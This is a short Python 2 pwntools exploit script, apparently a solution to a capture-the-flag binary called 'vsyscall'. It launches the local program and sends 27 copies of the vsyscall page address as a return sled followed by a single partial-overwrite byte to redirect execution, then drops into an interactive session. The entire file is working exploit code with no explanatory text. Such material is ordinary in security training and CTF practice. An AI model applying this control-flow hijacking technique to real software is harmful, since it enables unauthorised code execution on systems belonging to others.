#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import time
import struct

# context.log_level = "debug"
sh = process('./vsyscall')
elf = ELF('./vsyscall')

# 生成调试文件
try:
	f = open('pid', 'w')
	f.write(str(proc.pidof(sh)[0]))
	f.close()
except Exception as e:
	print(e)

ret_addr = 0xFFFFFFFFFF600000

# pause()
sh.send(p64(ret_addr) * 27 + '\x4e')

sh.interactive()

# 删除调试文件
os.system("rm -f pid")
